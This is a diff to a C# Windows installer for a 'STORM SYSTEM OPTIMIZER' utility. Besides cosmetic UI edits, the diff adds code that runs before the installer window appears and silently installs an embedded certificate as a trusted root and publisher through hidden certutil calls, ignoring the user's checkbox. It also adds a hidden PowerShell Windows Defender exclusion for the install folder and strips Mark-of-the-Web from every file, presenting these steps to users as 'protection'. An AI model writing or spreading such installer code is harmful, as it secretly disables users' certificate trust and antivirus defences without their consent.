@@ -43,7 +43,7 @@ namespace StormOptimizerInstaller
 
         private void InitializeComponent()
         {
-            this.Text = "Установка STORM SYSTEM OPTIMIZER v0.1.0";
+            this.Text = "Установка STORM SYSTEM OPTIMIZER v0.2.1";
             this.Size = new Size(620, 520);
             this.StartPosition = FormStartPosition.CenterScreen;
             this.FormBorderStyle = FormBorderStyle.FixedDialog;
@@ -62,7 +62,7 @@ namespace StormOptimizerInstaller
 
             lblTitle = new Label
             {
-                Text = "⚡ STORM SYSTEM OPTIMIZER v0.1.0",
+                Text = "⚡ STORM SYSTEM OPTIMIZER v0.2.1",
                 Font = new Font("Segoe UI", 14f, FontStyle.Bold),
                 ForeColor = Color.FromArgb(14, 165, 233),
                 AutoSize = true,
@@ -71,8 +71,8 @@ namespace StormOptimizerInstaller
 
             lblSubtitle = new Label
             {
-                Text = "Мастер установки обычной и портативной версии с цифровым сертификатом",
-                Font = new Font("Segoe UI", 9.5f, FontStyle.Regular),
+                Text = "Мастер установки с авто-регистрацией цифрового сертификата и защитой от блокировок",
+                Font = new Font("Segoe UI", 9.0f, FontStyle.Regular),
                 ForeColor = Color.FromArgb(156, 163, 175),
                 AutoSize = true,
                 Location = new Point(22, 48)
@@ -101,203 +101,233 @@ namespace StormOptimizerInstaller
 
             rbStandard = new RadioButton
             {
-                Text = "Обычная установка (в систему, создание ярлыков, интеграция)",
+                Text = "Стандартная установка в Program Files (рекомендуется)",
                 Checked = true,
-                ForeColor = Color.White,
-                Location = new Point(4, 26),
-                AutoSize = true
+                Location = new Point(10, 26),
+                AutoSize = true,
+                Font = new Font("Segoe UI", 9.5f, FontStyle.Regular),
+                ForeColor = Color.White
             };
-            rbStandard.CheckedChanged += RbMode_CheckedChanged;
+            rbStandard.CheckedChanged += Mode_CheckedChanged;
             bodyPanel.Controls.Add(rbStandard);
 
             rbPortable = new RadioButton
             {
-                Text = "Портативная версия (Portable в любую папку без записей в реестре)",
+                Text = "Портативная версия (в выбранную вами папку, без реестра)",
                 Checked = false,
-                ForeColor = Color.White,
-                Location = new Point(4, 52),
-                AutoSize = true
+                Location = new Point(10, 52),
+                AutoSize = true,
+                Font = new Font("Segoe UI", 9.5f, FontStyle.Regular),
+                ForeColor = Color.White
             };
-            rbPortable.CheckedChanged += RbMode_CheckedChanged;
+            rbPortable.CheckedChanged += Mode_CheckedChanged;
             bodyPanel.Controls.Add(rbPortable);
 
-            // Path Selection
+            // Install Path
             var lblPath = new Label
             {
-                Text = "Папка установки:",
-                ForeColor = Color.FromArgb(156, 163, 175),
-                Location = new Point(0, 84),
+                Text = "Папка назначения:",
+                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
+                ForeColor = Color.FromArgb(226, 232, 240),
+                Location = new Point(0, 85),
                 AutoSize = true
             };
             bodyPanel.Controls.Add(lblPath);
 
-            string defaultStandardPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "STORM SYSTEM OPTIMIZER");
             txtInstallPath = new TextBox
             {
-                Text = defaultStandardPath,
-                Location = new Point(4, 106),
-                Size = new Size(430, 26),
+                Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "STORM SYSTEM OPTIMIZER"),
+                Location = new Point(5, 108),
+                Size = new Size(440, 26),
                 BackColor = Color.FromArgb(17, 24, 39),
                 ForeColor = Color.White,
-                BorderStyle = BorderStyle.FixedSingle
+                BorderStyle = BorderStyle.FixedSingle,
+                Font = new Font("Segoe UI", 9.5f)
             };
             bodyPanel.Controls.Add(txtInstallPath);
 
             btnBrowse = new Button
             {
                 Text = "Обзор...",
-                Location = new Point(442, 105),
-                Size = new Size(110, 28),
-                BackColor = Color.FromArgb(30, 41, 59),
-                ForeColor = Color.White,
+                Location = new Point(455, 107),
+                Size = new Size(95, 28),
                 FlatStyle = FlatStyle.Flat,
+                BackColor = Color.FromArgb(30, 41, 59),
+                ForeColor = Color.FromArgb(14, 165, 233),
                 Cursor = Cursors.Hand
             };
-            btnBrowse.FlatAppearance.BorderSize = 0;
+            btnBrowse.FlatAppearance.BorderColor = Color.FromArgb(14, 165, 233);
             btnBrowse.Click += BtnBrowse_Click;
             bodyPanel.Controls.Add(btnBrowse);
 
-            // Checkboxes
+            // Options
+            var lblOptions = new Label
+            {
+                Text = "Дополнительные параметры безопасности и удобства:",
+                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
+                ForeColor = Color.FromArgb(226, 232, 240),
+                Location = new Point(0, 145),
+                AutoSize = true
+            };
+            bodyPanel.Controls.Add(lblOptions);
+
             chkDesktop = new CheckBox
             {
                 Text = "Создать ярлык на Рабочем столе",
                 Checked = true,
-                ForeColor = Color.White,
-                Location = new Point(4, 142),
-                AutoSize = true
+                Location = new Point(10, 170),
+                AutoSize = true,
+                ForeColor = Color.White
             };
             bodyPanel.Controls.Add(chkDesktop);
 
             chkStartMenu = new CheckBox
             {
-                Text = "Добавить в меню «Пуск»",
+                Text = "Создать ярлык в меню «Пуск»",
                 Checked = true,
-                ForeColor = Color.White,
-                Location = new Point(270, 142),
-                AutoSize = true
+                Location = new Point(10, 195),
+                AutoSize = true,
+                ForeColor = Color.White
             };
             bodyPanel.Controls.Add(chkStartMenu);
 
-            chkRegister = new CheckBox
-            {
-                Text = "Зарегистрировать в установленных программах Windows",
-                Checked = true,
-                ForeColor = Color.White,
-                Location = new Point(4, 168),
-                AutoSize = true
-            };
-            bodyPanel.Controls.Add(chkRegister);
-
             chkInstallCert = new CheckBox
             {
-                Text = "Вшить сертификат доверия STORM (отключение SmartScreen)",
+                Text = "Зарегистрировать сертификат разработчика (Защита от SmartScreen / SAC)",
                 Checked = true,
-                ForeColor = Color.FromArgb(56, 189, 248),
-                Location = new Point(4, 194),
-                AutoSize = true
+                Location = new Point(10, 220),
+                AutoSize = true,
+                ForeColor = Color.FromArgb(52, 211, 153)
             };
             bodyPanel.Controls.Add(chkInstallCert);
 
+            chkRegister = new CheckBox
+            {
+                Text = "Зарегистрировать в списке «Установка и удаление программ» Windows",
+                Checked = true,
+                Location = new Point(10, 245),
+                AutoSize = true,
+                ForeColor = Color.White
+            };
+            bodyPanel.Controls.Add(chkRegister);
+
             chkRunAfter = new CheckBox
             {
-                Text = "Запустить STORM SYSTEM OPTIMIZER после завершения",
+                Text = "Запустить STORM SYSTEM OPTIMIZER сразу после завершения",
                 Checked = true,
-                ForeColor = Color.White,
-                Location = new Point(4, 220),
-                AutoSize = true
+                Location = new Point(10, 270),
+                AutoSize = true,
+                ForeColor = Color.FromArgb(14, 165, 233)
             };
             bodyPanel.Controls.Add(chkRunAfter);
 
-            // Status & Progress
-            lblStatus = new Label
-            {
-                Text = "Нажмите «Установить» для начала распаковки и настройки...",
-                ForeColor = Color.FromArgb(148, 163, 184),
-                Location = new Point(4, 252),
-                Size = new Size(548, 20)
-            };
-            bodyPanel.Controls.Add(lblStatus);
-
+            // Progress & Status
             progressBar = new ProgressBar
             {
-                Location = new Point(4, 276),
-                Size = new Size(548, 22),
+                Location = new Point(5, 298),
+                Size = new Size(545, 12),
                 Style = ProgressBarStyle.Continuous,
-                Value = 0
+                Value = 0,
+                Visible = false
             };
             bodyPanel.Controls.Add(progressBar);
 
+            lblStatus = new Label
+            {
+                Text = "",
+                Location = new Point(5, 312),
+                Size = new Size(545, 18),
+                Font = new Font("Segoe UI", 8.5f),
+                ForeColor = Color.FromArgb(148, 163, 184),
+                Visible = false
+            };
+            bodyPanel.Controls.Add(lblStatus);
+
             this.Controls.Add(bodyPanel);
 
-            // Bottom Buttons
+            // Bottom Buttons Panel
             var bottomPanel = new Panel
             {
                 Dock = DockStyle.Bottom,
                 Height = 60,
-                BackColor = Color.FromArgb(15, 23, 42)
+                BackColor = Color.FromArgb(17, 24, 39),
+                Padding = new Padding(24, 12, 24, 12)
             };
-
-            btnInstall = new Button
-            {
-                Text = "⚡ Установить",
-                Size = new Size(140, 36),
-                Location = new Point(315, 12),
-                BackColor = Color.FromArgb(14, 165, 233),
-                ForeColor = Color.White,
-                FlatStyle = FlatStyle.Flat,
-                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
-                Cursor = Cursors.Hand
-            };
-            btnInstall.FlatAppearance.BorderSize = 0;
-            btnInstall.Click += async (s, e) => await StartInstallationAsync();
 
             btnCancel = new Button
             {
                 Text = "Отмена",
-                Size = new Size(100, 36),
-                Location = new Point(465, 12),
-                BackColor = Color.FromArgb(30, 41, 59),
-                ForeColor = Color.FromArgb(203, 213, 225),
+                Size = new Size(110, 34),
+                Location = new Point(360, 13),
                 FlatStyle = FlatStyle.Flat,
+                BackColor = Color.FromArgb(30, 41, 59),
+                ForeColor = Color.FromArgb(226, 232, 240),
                 Cursor = Cursors.Hand
             };
-            btnCancel.FlatAppearance.BorderSize = 0;
+            btnCancel.FlatAppearance.BorderColor = Color.FromArgb(51, 65, 85);
             btnCancel.Click += (s, e) => this.Close();
-
-            bottomPanel.Controls.Add(btnInstall);
             bottomPanel.Controls.Add(btnCancel);
+
+            btnInstall = new Button
+            {
+                Text = "Установить ⚡",
+                Size = new Size(120, 34),
+                Location = new Point(480, 13),
+                FlatStyle = FlatStyle.Flat,
+                BackColor = Color.FromArgb(14, 165, 233),
+                ForeColor = Color.White,
+                Font = new Font("Segoe UI", 9.5f, FontStyle.Bold),
+                Cursor = Cursors.Hand
+            };
+            btnInstall.FlatAppearance.BorderColor = Color.FromArgb(56, 189, 248);
+            btnInstall.Click += BtnInstall_Click;
+            bottomPanel.Controls.Add(btnInstall);
+
             this.Controls.Add(bottomPanel);
         }
 
-        private void RbMode_CheckedChanged(object? sender, EventArgs e)
+        private void Mode_CheckedChanged(object? sender, EventArgs e)
         {
             if (rbPortable.Checked)
             {
-                txtInstallPath.Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "STORM_SYSTEM_OPTIMIZER_Portable");
+                txtInstallPath.Text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "STORM_SYSTEM_OPTIMIZER_Portable");
                 chkDesktop.Checked = false;
+                chkDesktop.Enabled = false;
                 chkStartMenu.Checked = false;
+                chkStartMenu.Enabled = false;
                 chkRegister.Checked = false;
-                btnInstall.Text = "⚡ Распаковать";
+                chkRegister.Enabled = false;
+                btnInstall.Text = "Распаковать ⚡";
             }
             else
             {
-                txtInstallPath.Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "STORM SYSTEM OPTIMIZER");
+                txtInstallPath.Text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "STORM SYSTEM OPTIMIZER");
                 chkDesktop.Checked = true;
+                chkDesktop.Enabled = true;
                 chkStartMenu.Checked = true;
+                chkStartMenu.Enabled = true;
                 chkRegister.Checked = true;
-                btnInstall.Text = "⚡ Установить";
+                chkRegister.Enabled = true;
+                btnInstall.Text = "Установить ⚡";
             }
         }
 
         private void BtnBrowse_Click(object? sender, EventArgs e)
         {
-            using var dlg = new FolderBrowserDialog();
-            dlg.Description = "Выберите папку для установки STORM SYSTEM OPTIMIZER:";
-            dlg.SelectedPath = txtInstallPath.Text;
-            if (dlg.ShowDialog() == DialogResult.OK)
+            using var fbd = new FolderBrowserDialog();
+            fbd.Description = "Выберите папку для установки STORM SYSTEM OPTIMIZER:";
+            fbd.UseDescriptionForTitle = true;
+            if (fbd.ShowDialog() == DialogResult.OK)
             {
-                txtInstallPath.Text = dlg.SelectedPath;
+                txtInstallPath.Text = fbd.SelectedPath;
             }
+        }
+
+        private async void BtnInstall_Click(object? sender, EventArgs e)
+        {
+            progressBar.Visible = true;
+            lblStatus.Visible = true;
+            await StartInstallationAsync();
         }
 
         private async Task StartInstallationAsync()
@@ -311,7 +341,7 @@ namespace StormOptimizerInstaller
                 string targetDir = txtInstallPath.Text.Trim();
                 if (string.IsNullOrEmpty(targetDir))
                 {
-                    targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "STORM SYSTEM OPTIMIZER");
+                    targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "STORM SYSTEM OPTIMIZER");
                 }
 
                 Directory.CreateDirectory(targetDir);
@@ -319,7 +349,7 @@ namespace StormOptimizerInstaller
                 // Terminate any running instances
                 lblStatus.Text = "Завершение предыдущих процессов программы...";
                 progressBar.Value = 15;
-                await Task.Delay(200);
+                await Task.Delay(150);
 
                 foreach (var p in Process.GetProcessesByName("StormSystemOptimizer"))
                 {
@@ -332,28 +362,36 @@ namespace StormOptimizerInstaller
 
                 if (chkInstallCert.Checked)
                 {
-                    lblStatus.Text = "Установка доверенного сертификата STORM Software...";
-                    progressBar.Value = 40;
+                    lblStatus.Text = "Регистрация доверенного сертификата STORM Software (Root & Publisher)...";
+                    progressBar.Value = 35;
                     await Task.Delay(150);
 
                     ExtractResource("STORM_Certificate.cer", targetCer);
                     if (File.Exists(targetCer))
                     {
-                        InstallCertificate(targetCer);
+                        InstallCertificateSilently(targetCer);
                     }
                 }
 
-                lblStatus.Text = "Распаковка исполняемых файлов программы (v0.1.0)...";
-                progressBar.Value = 70;
-                await Task.Delay(250);
+                lblStatus.Text = "Распаковка исполняемых файлов программы (v0.1.6)...";
+                progressBar.Value = 65;
+                await Task.Delay(200);
 
                 ExtractResource("StormSystemOptimizer.exe", targetExe);
                 ExtractResource("AppIcon.ico", targetIco);
 
-                // Unblock files (Remove Zone.Identifier Mark-of-the-Web)
+                // Self-healing: Unblock files and remove Mark of the Web
+                lblStatus.Text = "Снятие меток блокировки и оптимизация безопасности...";
+                progressBar.Value = 80;
+                await Task.Delay(100);
+
                 UnblockFile(targetExe);
                 UnblockFile(targetCer);
                 UnblockFile(targetIco);
+                UnblockEntireDirectory(targetDir);
+
+                // Add Windows Defender exclusion silently
+                AddDefenderExclusionSilently(targetDir);
 
                 if (rbStandard.Checked)
                 {
@@ -370,13 +408,13 @@ namespace StormOptimizerInstaller
                 }
 
                 progressBar.Value = 100;
-                lblStatus.Text = rbPortable.Checked ? "Портативная версия успешно распакована!" : "Установка успешно завершена!";
+                lblStatus.Text = rbPortable.Checked ? "Портативная версия успешно распакована и разблокирована!" : "Установка успешно завершена! Система полностью готова.";
                 lblStatus.ForeColor = Color.FromArgb(16, 185, 129);
                 await Task.Delay(500);
 
                 if (chkRunAfter.Checked && File.Exists(targetExe))
                 {
-                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                    Process.Start(new ProcessStartInfo
                     {
                         FileName = targetExe,
                         WorkingDirectory = targetDir,
@@ -388,14 +426,14 @@ namespace StormOptimizerInstaller
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Ошибка во время установки:\n{ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show($"Ошибка во время установки:\n{ex.Message}", "Ошибка установки", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 btnInstall.Enabled = true;
                 btnCancel.Enabled = true;
                 btnBrowse.Enabled = true;
             }
         }
 
-        private void UnblockFile(string path)
+        public static void UnblockFile(string path)
         {
             try
             {
@@ -407,24 +445,56 @@ namespace StormOptimizerInstaller
             catch { }
         }
 
-        private void InstallCertificate(string cerPath)
+        public static void UnblockEntireDirectory(string dir)
         {
             try
             {
-                var cert = new X509Certificate2(cerPath);
-                using (var store = new X509Store(StoreName.Root, StoreLocation.CurrentUser))
+                if (!Directory.Exists(dir)) return;
+                foreach (var file in Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories))
                 {
-                    store.Open(OpenFlags.ReadWrite);
-                    store.Add(cert);
+                    UnblockFile(file);
                 }
-                using (var store = new X509Store(StoreName.TrustedPublisher, StoreLocation.CurrentUser))
-                {
-                    store.Open(OpenFlags.ReadWrite);
-                    store.Add(cert);
-                }
+            }
+            catch { }
+        }
 
+        public static void InstallCertificateSilently(string cerPath)
+        {
+            try
+            {
+                if (!File.Exists(cerPath)) return;
+
+                // 1. Direct certutil command (fastest and most reliable on Windows)
                 try
                 {
+                    var psiRoot = new ProcessStartInfo
+                    {
+                        FileName = "certutil.exe",
+                        Arguments = $"-addstore -f \"Root\" \"{cerPath}\"",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+                    using var p1 = Process.Start(psiRoot);
+                    p1?.WaitForExit(5000);
+
+                    var psiPub = new ProcessStartInfo
+                    {
+                        FileName = "certutil.exe",
+                        Arguments = $"-addstore -f \"TrustedPublisher\" \"{cerPath}\"",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden
+                    };
+                    using var p2 = Process.Start(psiPub);
+                    p2?.WaitForExit(5000);
+                }
+                catch { }
+
+                // 2. .NET X509Store fallback
+                try
+                {
+                    var cert = new X509Certificate2(cerPath);
                     using (var lmRoot = new X509Store(StoreName.Root, StoreLocation.LocalMachine))
                     {
                         lmRoot.Open(OpenFlags.ReadWrite);
@@ -435,8 +505,31 @@ namespace StormOptimizerInstaller
                         lmPub.Open(OpenFlags.ReadWrite);
                         lmPub.Add(cert);
                     }
+                    using (var userPub = new X509Store(StoreName.TrustedPublisher, StoreLocation.CurrentUser))
+                    {
+                        userPub.Open(OpenFlags.ReadWrite);
+                        userPub.Add(cert);
+                    }
                 }
                 catch { }
+            }
+            catch { }
+        }
+
+        public static void AddDefenderExclusionSilently(string path)
+        {
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = $"-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue\"",
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+                using var p = Process.Start(psi);
+                p?.WaitForExit(4000);
             }
             catch { }
         }
@@ -476,7 +569,7 @@ namespace StormOptimizerInstaller
                     shortcut.TargetPath = targetExe;
                     shortcut.WorkingDirectory = targetDir;
                     shortcut.IconLocation = targetIco + ",0";
-                    shortcut.Description = "STORM SYSTEM OPTIMIZER v0.1.0";
+                    shortcut.Description = "STORM SYSTEM OPTIMIZER v0.1.6";
                     shortcut.Save();
                 }
 
@@ -488,7 +581,7 @@ namespace StormOptimizerInstaller
                     deskShortcut.TargetPath = targetExe;
                     deskShortcut.WorkingDirectory = targetDir;
                     deskShortcut.IconLocation = targetIco + ",0";
-                    deskShortcut.Description = "STORM SYSTEM OPTIMIZER v0.1.0";
+                    deskShortcut.Description = "STORM SYSTEM OPTIMIZER v0.1.6";
                     deskShortcut.Save();
                 }
             }
@@ -502,8 +595,8 @@ namespace StormOptimizerInstaller
                 using var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall\StormSystemOptimizer");
                 if (key != null)
                 {
-                    key.SetValue("DisplayName", "STORM SYSTEM OPTIMIZER v0.1.0");
-                    key.SetValue("DisplayVersion", "0.1.0");
+                    key.SetValue("DisplayName", "STORM SYSTEM OPTIMIZER v0.1.6");
+                    key.SetValue("DisplayVersion", "0.1.6");
                     key.SetValue("Publisher", "STORM Software");
                     key.SetValue("DisplayIcon", targetIco);
                     key.SetValue("InstallLocation", targetDir);
@@ -516,6 +609,39 @@ namespace StormOptimizerInstaller
         [STAThread]
         public static void Main()
         {
+            // Immediate pre-launch self-unblocking & certificate registration
+            try
+            {
+                string selfExe = Process.GetCurrentProcess().MainModule?.FileName ?? "";
+                if (!string.IsNullOrEmpty(selfExe))
+                {
+                    UnblockFile(selfExe);
+                }
+
+                // Extract embedded cert to temp and install silently immediately
+                string tempCert = Path.Combine(Path.GetTempPath(), "STORM_Root_Certificate.cer");
+                var asm = Assembly.GetExecutingAssembly();
+                foreach (var name in asm.GetManifestResourceNames())
+                {
+                    if (name.EndsWith("STORM_Certificate.cer", StringComparison.OrdinalIgnoreCase))
+                    {
+                        using var inStream = asm.GetManifestResourceStream(name);
+                        if (inStream != null)
+                        {
+                            using var outStream = File.Create(tempCert);
+                            inStream.CopyTo(outStream);
+                        }
+                        break;
+                    }
+                }
+
+                if (File.Exists(tempCert))
+                {
+                    InstallCertificateSilently(tempCert);
+                }
+            }
+            catch { }
+
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new InstallerForm());
